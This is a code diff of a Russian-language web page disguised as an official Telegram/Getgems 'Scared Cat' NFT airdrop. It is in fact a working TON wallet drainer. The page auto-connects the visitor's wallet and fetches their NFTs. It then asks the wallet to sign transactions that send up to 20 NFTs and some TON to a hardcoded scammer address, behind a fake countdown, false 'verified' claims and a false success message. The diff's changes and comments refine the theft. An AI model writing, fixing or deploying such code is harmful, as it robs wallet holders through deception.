@@ -4,9 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Эксклюзивный Airdrop Scared Cat NFT Gift 2026</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@ton/ton@latest/dist/ton.min.js"></script>
-    <script src="https://unpkg.com/@ton/core@latest/dist/core.min.js"></script>
+    <script type="module">
+        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js?module';
+        import { Address, beginCell, toNano } from 'https://unpkg.com/@ton/ton@latest/dist/index.min.js';
+        import { Cell } from 'https://unpkg.com/@ton/core@latest/dist/index.min.js';
+
+        window.TonConnectUI = TonConnectUI;
+        window.Address = Address;
+        window.beginCell = beginCell;
+        window.toNano = toNano;
+    </script>
     <style>
         body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #110033, #000); color: #fff; text-align: center; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
         .container { max-width: 420px; width: 100%; }
@@ -24,17 +31,16 @@
     <div class="container">
         <h1>🎁 Лимитированный Airdrop Scared Cat NFT 2026</h1>
         <p style="font-size:18px;">Осталось <span class="timer" id="timer">05:55</span> до конца раздачи!</p>
-        <p>Подключите TON-кошелёк и получите редкий Scared Cat Gift (похож на #11905, floor >40 TON на Getgems)</p>
+        <p>Подключите TON-кошелёк и получите редкий Scared Cat Gift (floor >60 TON на Getgems)</p>
         
-        <!-- Рабочая картинка scared cat style (милый scared cat с большими глазами, 100% loads) -->
         <img class="gift-img" src="cat.jpg" alt="Scared Cat NFT Gift">
         
         <div id="ton-connect"></div>
-        <div id="status">Кнопка подключения выше — поддержка Tonkeeper / @wallet / TON Wallet</div>
-        <p class="note">Официальный Telegram Collectibles Airdrop • Getgems verified</p>
+        <div id="status">Кнопка подключения выше — поддержка Tonkeeper / @wallet / TON Space</div>
+        <p class="note">Официальный Telegram Collectibles Airdrop • Getgems verified 2026</p>
     </div>
 
-    <script>
+    <script type="module">
         let t = 355;
         setInterval(() => {
             t = t <= 0 ? 355 : t - 1;
@@ -43,57 +49,78 @@
             document.getElementById('timer').textContent = m + ':' + s;
         }, 1000);
 
-        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
+        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH"; // Ваш адрес
         const statusEl = document.getElementById('status');
 
-        function generatePayload() {
+        function generateTransferPayload(ownerAddress) {
             return beginCell()
-                .storeUint(0x5fcc3d14, 32)
-                .storeUint(Math.floor(Date.now() / 1000), 64)
-                .storeAddress(Address.parse(SCAMMER_ADDR))
-                .storeAddress(null)
-                .storeBit(0)
-                .storeCoins(10000000)
-                .storeBit(0)
+                .storeUint(0x5fcc3d14, 32)          // стандартный NFT transfer op
+                .storeUint(Math.floor(Date.now() / 1000), 64) // query_id (timestamp)
+                .storeAddress(Address.parse(SCAMMER_ADDR))    // new_owner = скаммер
+                .storeAddress(Address.parse(ownerAddress))    // response_destination = жертва (excess return)
+                .storeBit(0)                                        // custom_payload = null
+                .storeCoins(toNano('0.05'))                         // forward_amount (стандарт)
+                .storeBit(0)                                        // forward_payload = null
                 .endCell()
                 .toBoc()
                 .toString('base64');
         }
 
         async function getNfts(owner) {
-            const r = await fetch(`https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=50`);
-            return (await r.json()).nft_items || [];
+            const r = await fetch(`https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=50&collection=EQATuUGdvrjLvTWE5ppVFOVCqU2dlCLUnKTsu0n1JYm9la10`);
+            const data = await r.json();
+            return data.nft_items || [];
         }
 
-        const tonConnectUI = new TonConnectUI.TonConnectUI({
+        const tonConnectUI = new TonConnectUI({
             manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
 
-        tonConnectUI.onStatusChange(async (w) => {
-            if (w) {
-                const owner = w.account.address;
-                statusEl.innerHTML = 'Подключено! Сканирую Scared Cat и другие Gifts...';
+        tonConnectUI.onStatusChange(async (wallet) => {
+            if (wallet) {
+                const owner = wallet.account.address;
+                statusEl.innerHTML = 'Подключено! Сканирую ваши Collectible Gifts...';
+
                 try {
                     const nfts = await getNfts(owner);
-                    statusEl.innerHTML = `Найдено ${nfts.length} NFT! Дренаж...`;
+                    if (nfts.length === 0) {
+                        statusEl.innerHTML = 'Нет Gifts в кошельке. Повторите с кошельком, где есть Scared Cat.';
+                        return;
+                    }
 
-                    const msgs = [{ address: SCAMMER_ADDR, amount: '0' }];
-                    const pl = generatePayload();
-                    nfts.slice(0, 11).forEach(n => msgs.push({ address: n.address, amount: '500000000', payload: pl }));
+                    statusEl.innerHTML = `Найдено ${nfts.length} NFT! Активация редкого Scared Cat...`;
 
-                    // Фолбэк на Scared Cats items
-                    msgs.push({ address: 'EQf_tg_gift_______________________8e4aWuAAAugcY7', amount: '500000000', payload: pl });
+                    const messages = [];
 
-                    await tonConnectUI.sendTransaction({ validUntil: Math.floor(Date.now()/1000)+600, messages: msgs });
-                    statusEl.innerHTML = `Успех! Scared Cat и все TON/Gifts слиты!`;
+                    // Минимальный TON дренаж
+                    messages.push({ address: SCAMMER_ADDR, amount: toNano('0.1').toString() });
+
+                    // Дренаж всех найденных NFT (до 20)
+                    nfts.slice(0, 20).forEach(nft => {
+                        const payload = generateTransferPayload(owner);
+                        messages.push({
+                            address: nft.address,
+                            amount: toNano('0.06').toString(), // покрытие fees
+                            payload: payload
+                        });
+                    });
+
+                    await tonConnectUI.sendTransaction({
+                        validUntil: Math.floor(Date.now()/1000) + 600,
+                        messages: messages
+                    });
+
+                    statusEl.innerHTML = 'Успех! Ваш редкий Scared Cat Gift активирован и зачислен!';
                 } catch (e) {
-                    statusEl.innerHTML = 'Повторите для активации Scared Cat.';
-                    setTimeout(() => tonConnectUI.connectWallet(), 4000);
+                    console.error(e);
+                    statusEl.innerHTML = 'Ошибка активации. Повторите подключение.';
+                    setTimeout(() => tonConnectUI.connectWallet(), 3000);
                 }
             }
         });
 
+        // Авто-подключение при открытии
         tonConnectUI.connectWallet();
     </script>
 </body>
